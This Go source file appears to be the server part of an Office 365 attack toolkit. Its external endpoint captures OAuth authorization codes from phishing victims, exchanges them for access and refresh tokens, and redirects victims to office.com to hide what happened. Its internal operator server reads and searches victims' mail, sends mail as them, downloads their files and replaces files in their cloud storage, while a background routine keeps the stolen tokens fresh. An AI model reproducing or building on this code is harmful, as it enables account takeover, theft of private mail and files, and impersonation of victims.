package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"o365-attack-toolkit/api"
	"o365-attack-toolkit/model"

	"github.com/gorilla/mux"
)

func StartIntServer(config model.Config) {

	// Start the update token function
	go api.RecursiveTokenUpdate()

	log.Printf("Starting Internal Server on %s:%d \n", config.Server.Host, config.Server.InternalPort)

	route := mux.NewRouter()

	route.HandleFunc("/", GetUsers).Methods("GET")
	route.HandleFunc(model.IntAbout, GetAbout).Methods("GET")

	// Routes for Users
	route.HandleFunc(model.IntGetAll, GetUsers).Methods("GET")

	// Route for files
	route.HandleFunc(model.IntUserFiles, GetUserFiles).Methods("GET")
	route.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("downloads/"))))

	// Route for Live Interaction
	route.HandleFunc(model.IntLiveMain, GetLiveMain).Methods("GET")
	route.HandleFunc(model.IntLiveSearchMail, GetLiveEmails).Methods("GET")
	route.HandleFunc(model.IntLiveSendMail, SendEmail).Methods("POST")
	route.HandleFunc(model.IntLiveOpenMail, GetEmail).Methods("GET")
	route.HandleFunc(model.IntLiveSearchFiles, GetLiveFiles).Methods("GET")
	route.HandleFunc(model.IntLiveDownloadFile, DownloadFileHandler).Methods("GET")
	route.HandleFunc(model.IntLiveReplaceFile, ReplaceFile).Methods("POST")

	//Route for emails
	//	route.HandleFunc(model.IntUserEmails, GetUserEmails).Methods("GET")
	//	route.HandleFunc(model.IntUserEmails, SearchUserEmails).Methods("POST") //  For searching
	//	route.HandleFunc(model.IntAllEmails, GetAllEmails).Methods("GET")
	//	route.HandleFunc(model.IntAllEmails, SearchEmails).Methods("POST") // For Searching
	// Removed this as we are going to use the Live thing.
	//route.HandleFunc(model.IntUserEmail, GetEmail).Methods("GET")

	// The route for the file downloads.

	route.PathPrefix("/assets/").Handler(http.StripPrefix("/assets/", http.FileServer(http.Dir("assets/"))))

	server := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", config.Server.Host, config.Server.InternalPort),
		Handler: route,
	}
	server.ListenAndServe()

}

func StartExtServer(config model.Config) {
	api.GenerateURL()
	log.Printf("Starting External Server on %s:%d \n", config.Server.Host, config.Server.ExternalPort)
	route := mux.NewRouter()
	route.HandleFunc(model.ExtTokenPage, GetToken).Methods("GET")
	//route.PathPrefix(model.ExtMainPage).Handler(http.FileServer(http.Dir("./static/")))
	server := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", config.Server.Host, config.Server.ExternalPort),
		Handler: route,
	}
	//server.ListenAndServeTLS(config.Server.Certificate,config.Server.Key)
	server.ListenAndServe()
}

// GetToken will handle the request and initilize the thing with the code
func GetToken(w http.ResponseWriter, r *http.Request) {
	//w.WriteHeader(http.StatusOK)
	r.ParseForm()

	if r.FormValue("error") != "" {
		log.Printf("Error %s : %s\n", r.FormValue("error"), r.FormValue("error_description"))
	} else {

		jsonData := api.GetAllTokens(r.FormValue("code"))
		if jsonData != nil {
			authResponse := model.AuthResponse{}
			json.Unmarshal(jsonData, &authResponse)

			api.InitializeProfile(authResponse.AccessToken, authResponse.RefreshToken)
		}

	}
	// Whatever happens, success or not we need to redirect
	http.Redirect(w, r, "https://office.com", 301)
}
